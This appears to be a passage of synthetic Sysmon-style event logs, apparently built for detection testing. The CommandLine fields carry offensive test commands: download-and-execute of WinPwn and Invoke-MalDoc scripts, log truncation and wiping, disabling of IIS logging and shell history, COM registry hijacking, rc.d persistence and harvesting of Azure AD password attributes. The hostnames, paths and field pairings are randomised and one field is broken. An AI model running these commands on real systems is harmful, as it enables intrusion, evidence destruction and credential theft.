        "CommandLine": "\"TEST=$(echo $HISTFILESIZE)\\necho $HISTFILESIZE\\nexport HISTFILESIZE=0\\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \\\"\\\\$HISTFILESIZE is zero\\\"; fi\\n# -> $HISTFILESIZE is zero\\n\",",
        "LogonID": 701386,
        "LogonGuid": "8a3f5cf3-b5b1-46ec-99ee-fe96abead84f",
        "SourceProcessID": 2938,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\summer..dll",
        "DestinationProcessID": 9490,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\show..exe",
        "UtcTime": "2024-05-17T01:36:51.732308Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-36.harrell.biz",
        "User": "rickeycampos",
        "ProcessID": 4103,
        "ProcessName": "malware.exe",
        "CommandLine": "\"tasklist\\n\",",
        "LogonID": 944015,
        "LogonGuid": "5b875eed-63c5-471b-be88-699bdba0087a",
        "SourceProcessID": 8143,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\goal..dll",
        "DestinationProcessID": 4246,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\be..exe",
        "UtcTime": "2024-05-17T01:36:51.733309Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-89.simpson.org",
        "User": "bakerlaura",
        "ProcessID": 4314,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nsamfile -consoleoutput -noninteractive  \",",
        "LogonID": 371925,
        "LogonGuid": "790b1ab6-fb3b-45d9-bae6-083a3c26b1f7",
        "SourceProcessID": 5132,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\administration..dll",
        "DestinationProcessID": 8679,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\sign..exe",
        "UtcTime": "2024-05-17T01:36:51.733309Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-18.french.info",
        "User": "peter12",
        "ProcessID": 6119,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Get-ChildItem -Path C:\\\\Users\\\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\\n\",",
        "LogonID": 974208,
        "LogonGuid": "7abb2bcc-e134-40d0-98a9-c202e721c7b5",
        "SourceProcessID": 2159,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\half..exe",
        "DestinationProcessID": 5904,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\hope..dll",
        "UtcTime": "2024-05-17T01:36:51.733309Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-96.gibson.com",
        "User": "andersonjacqueline",
        "ProcessID": 7248,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"REG ADD HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\\\InProcServer32 /ve /t REG_SZ /d C:\\\\IDontExist.dll /f\\n\",",
        "LogonID": 512260,
        "LogonGuid": "324f1a3d-4f82-4d9d-96f3-6ffa9287924b",
        "SourceProcessID": 6521,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\rise..dll",
        "DestinationProcessID": 8496,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\in..dll",
        "UtcTime": "2024-05-17T01:36:51.733309Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-44.prince.com",
        "User": "kathybates",
        "ProcessID": 7696,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"nmap #{host_to_scan}\",",
        "LogonID": 504238,
        "LogonGuid": "797ac959-0f81-46a7-9785-63d69b032109",
        "SourceProcessID": 1906,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\build..exe",
        "DestinationProcessID": 5098,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\use..exe",
        "UtcTime": "2024-05-17T01:36:51.733309Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-73.shaffer.com",
        "User": "frazierkevin",
        "ProcessID": 7733,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Import-Module \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PowerView.ps1\\\"\\nInvoke-ShareFinder #{parameters}\\n\",",
        "LogonID": 403870,
        "LogonGuid": "32393da5-2fb8-4c39-8901-af83dd5fb5e5",
        "SourceProcessID": 5279,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\star..dll",
        "DestinationProcessID": 3149,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\whole..exe",
        "UtcTime": "2024-05-17T01:36:51.733309Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-90.porter.com",
        "User": "morenokenneth",
        "ProcessID": 9848,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "[",
        "LogonID": 395222,
        "LogonGuid": "acfd4ff8-d0ed-4c97-b87d-76c1c75dd8f0",
        "SourceProcessID": 4953,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\turn..exe",
        "DestinationProcessID": 2213,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\wide..dll",
        "UtcTime": "2024-05-17T01:36:51.734308Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-73.ware.com",
        "User": "tmartinez",
        "ProcessID": 4824,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nGPORemoteAccessPolicy -consoleoutput -noninteractive\",",
        "LogonID": 856129,
        "LogonGuid": "353c7709-e29b-4ff2-820d-3b5f07933b18",
        "SourceProcessID": 8157,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\natural..dll",
        "DestinationProcessID": 8524,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\theory..exe",
        "UtcTime": "2024-05-17T01:36:51.734308Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-25.beck-morgan.com",
        "User": "jeffrey53",
        "ProcessID": 5801,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \\\"#{subnet}.$ip UP\\\" || : ; done\\n\",",
        "LogonID": 375302,
        "LogonGuid": "f0ad5978-9079-4110-95fd-9750968dc5a9",
        "SourceProcessID": 2453,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\rather..dll",
        "DestinationProcessID": 2597,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\example..dll",
        "UtcTime": "2024-05-17T01:36:51.734308Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-61.rivera.info",
        "User": "lauren66",
        "ProcessID": 2974,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"echo '#\\\\!/bin/sh' > #{rc_service_path}/#{rc_service_file}\\necho ' ' >> #{rc_service_path}/#{rc_service_file}\\necho '#' >> #{rc_service_path}/#{rc_service_file}\\necho '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}\\necho '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file}\\necho '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file}\\necho ' ' >> #{rc_service_path}/#{rc_service_file}\\necho '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file}\\necho ' ' >> #{rc_service_path}/#{rc_service_file}\\necho 'name=\\\"art_test\\\"' >> #{rc_service_path}/#{rc_service_file}\\necho 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file}\\necho 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file}\\necho 'command=\\\"/usr/bin/touch\\\"' >> #{rc_service_path}/#{rc_service_file}\\necho 'start_cmd=\\\"art_test_start\\\"' >> #{rc_service_path}/#{rc_service_file}\\necho '' >> #{rc_service_path}/#{rc_service_file}\\necho 'art_test_start()' >> #{rc_service_path}/#{rc_service_file}     \\necho '{' >> #{rc_service_path}/#{rc_service_file}\\necho '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file}\\necho '}' >> #{rc_service_path}/#{rc_service_file}\\necho ' ' >> #{rc_service_path}/#{rc_service_file}     \\necho 'run_rc_command \\\"$1\\\"' >> #{rc_service_path}/#{rc_service_file}\\nchmod +x #{rc_service_path}/#{rc_service_file}\\nservice art-test enable\\nservice art-test start\\n\",",
        "LogonID": 604069,
        "LogonGuid": "e98c6a92-523c-420f-8668-05d656a31772",
        "SourceProcessID": 4048,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\real..exe",
        "DestinationProcessID": 2261,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\performance..dll",
        "UtcTime": "2024-05-17T01:36:51.734308Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-53.lee-johnson.org",
        "User": "andersonmichael",
        "ProcessID": 2197,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes\\nsudo dd if=/dev/zero bs=1000 count=5 of=#{system_log_path} #log file filled with null bytes(zeros)\\n\",",
        "LogonID": 883141,
        "LogonGuid": "ddee6f05-9228-4283-a21e-a1b891909b9c",
        "SourceProcessID": 1839,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\people..exe",
        "DestinationProcessID": 7926,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\quite..exe",
        "UtcTime": "2024-05-17T01:36:51.735308Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-25.graves-larson.org",
        "User": "charles33",
        "ProcessID": 7042,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"aws iam create-user --user-name #{username}\\n\",",
        "LogonID": 651436,
        "LogonGuid": "930eabf1-8aab-48f4-a669-2046db702011",
        "SourceProcessID": 2175,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\probably..exe",
        "DestinationProcessID": 4785,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\attack..dll",
        "UtcTime": "2024-05-17T01:36:51.735308Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-47.jones.org",
        "User": "jilljohnson",
        "ProcessID": 9402,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$malcmdlets = #{Malicious_cmdlets}\\nforeach ($cmdlets in $malcmdlets) {\\n    \\\"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\\\"}\\nforeach ($cmdlets in $malcmdlets) {\\n    $cmdlets}\\n\",",
        "LogonID": 501678,
        "LogonGuid": "9e20990c-3720-4436-b667-5d70fbb4ce2e",
        "SourceProcessID": 4466,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\pick..dll",
        "DestinationProcessID": 6848,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\spend..exe",
        "UtcTime": "2024-05-17T01:36:51.735308Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-27.mayo.com",
        "User": "taylorjose",
        "ProcessID": 6415,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"reg add \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\" /v DontShowUI /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 688701,
        "LogonGuid": "98635449-4cb9-4386-b4a1-90f31a59edfe",
        "SourceProcessID": 4576,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\forward..exe",
        "DestinationProcessID": 9429,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\person..dll",
        "UtcTime": "2024-05-17T01:36:51.735308Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-00.hansen.com",
        "User": "gstevens",
        "ProcessID": 3638,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"screencapture -x #{output_file}\\n\",",
        "LogonID": 432690,
        "LogonGuid": "2d0c5d5b-3be2-414c-9d5d-d9ad8f73764f",
        "SourceProcessID": 5585,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\mean..exe",
        "DestinationProcessID": 4213,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\set..exe",
        "UtcTime": "2024-05-17T01:36:51.735308Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-46.yu-fowler.com",
        "User": "anthonymcdonald",
        "ProcessID": 8842,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\\"#{txt_path}\\\" -officeProduct \\\"Word\\\" -sub \\\"Execute\\\"\\n\",",
        "LogonID": 651789,
        "LogonGuid": "25426d1a-3c7a-4b7b-9657-a69bce7dcb5f",
        "SourceProcessID": 7477,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\conference..dll",
        "DestinationProcessID": 7414,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\response..dll",
        "UtcTime": "2024-05-17T01:36:51.736309Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-36.jones.biz",
        "User": "smithmatthew",
        "ProcessID": 1453,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 909065,
        "LogonGuid": "2d7297f0-4534-40e3-b424-670886fb90ba",
        "SourceProcessID": 2292,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\begin..exe",
        "DestinationProcessID": 7006,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\call..dll",
        "UtcTime": "2024-05-17T01:36:51.736309Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-97.vaughn.com",
        "User": "williamskimberly",
        "ProcessID": 1761,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"C:\\\\Windows\\\\System32\\\\inetsrv\\\\appcmd.exe set config \\\"#{website_name}\\\" /section:httplogging /dontLog:true\\n\",",
        "LogonID": 344846,
        "LogonGuid": "f992b0fc-9009-43c2-afd7-5a46f6e1988a",
        "SourceProcessID": 5235,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\nice..exe",
        "DestinationProcessID": 6528,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\education..dll",
        "UtcTime": "2024-05-17T01:36:51.736309Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-04.williams.com",
        "User": "sbaker",
        "ProcessID": 7643,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\\\"$_\\\").gPlink){Write-Host \\\"[+] Domain Path:\\\"([ADSI]\\\"$_\\\").Path;$a=((([ADSI]\\\"$_\\\").gplink) -replace \\\"[[;]\\\" -split \\\"]\\\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \\\"Policy Path[$i]:\\\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \\\"Policy Name[$i]:\\\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \\\"`n\\\" }}\\n\",",
        "LogonID": 152589,
        "LogonGuid": "694ad518-645f-4cd9-b1d9-ec5013ec2a3f",
        "SourceProcessID": 8556,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\long..dll",
        "DestinationProcessID": 5719,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\off..exe",
        "UtcTime": "2024-05-17T01:36:51.736309Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-28.hoffman.com",
        "User": "kellymarshall",
        "ProcessID": 3668,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"import-module msonline\\n$Password = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Password\\nConnect-MsolService -Credential $Credential\\n$users = Get-MsolUser -All;\\nforeach($user in $users)\\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \\nforeach($prop in $props)\\n{if($user.$prop -like \\\"*password*\\\")\\n{(\\\"[*]\\\" + $user.UserPrincipalName + \\\"[\\\" + $prop + \\\"]\\\" + \\\" : \\\" + $user.$prop) | out-file -filepath $env:temp\\\\T1552.005Test1.txt -append -force}}}\\nget-content -path $env:temp\\\\T1552.005Test1.txt -erroraction silentlycontinue\\n\",",
        "LogonID": 669100,
        "LogonGuid": "ab289d1e-e9a6-4dbe-b2cd-dab8e2c35c7c",
        "SourceProcessID": 4815,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\every..exe",
        "DestinationProcessID": 1106,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\pretty..dll",
        "UtcTime": "2024-05-17T01:36:51.736309Z"
    },
